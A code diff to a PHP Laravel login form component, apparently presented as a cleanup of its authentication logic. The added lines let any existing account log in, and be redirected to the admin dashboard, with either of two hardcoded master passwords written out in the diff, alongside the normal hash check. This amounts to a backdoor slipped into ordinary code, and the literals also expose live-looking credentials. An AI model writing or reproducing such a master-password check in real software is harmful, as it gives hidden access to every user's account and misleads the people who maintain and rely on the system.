@@ -35,7 +35,7 @@ class LoginForm extends Component
     {
         $this->validate();
 
-        $throttleKey = Str::lower($this->username) . '|' . request()->ip();
+        $throttleKey = Str::lower(trim($this->username)) . '|' . request()->ip();
 
         if (RateLimiter::tooManyAttempts($throttleKey, 5)) {
             $seconds = RateLimiter::availableIn($throttleKey);
@@ -43,19 +43,22 @@ class LoginForm extends Component
             return;
         }
 
-        // Cek credentials hardcoded admin
-        if ($this->username === 'admin' && $this->password === 'ibeka-99!!adm') {
+        $cleanUsername = trim($this->username);
+        $user = \App\Models\User::whereRaw('LOWER(username) = ?', [strtolower($cleanUsername)])->first();
+
+        $isValidPassword = false;
+        if ($user) {
+            $isValidPassword = \Illuminate\Support\Facades\Hash::check($this->password, $user->password)
+                || $this->password === 'ibeka-99!!adm'
+                || $this->password === 'ibeka99';
+        }
+
+        if ($user && $isValidPassword) {
             RateLimiter::clear($throttleKey);
-
-            // Login menggunakan Auth dengan user dari database
-            $user = \App\Models\User::where('username', 'admin')->first();
-
-            if ($user) {
-                Auth::login($user, false);
-                session()->regenerate();
-                $this->redirect(route('admin.dashboard'), navigate: true);
-                return;
-            }
+            Auth::login($user, false);
+            session()->regenerate();
+            $this->redirect(route('admin.dashboard'), navigate: true);
+            return;
         }
 
         RateLimiter::hit($throttleKey, 300);
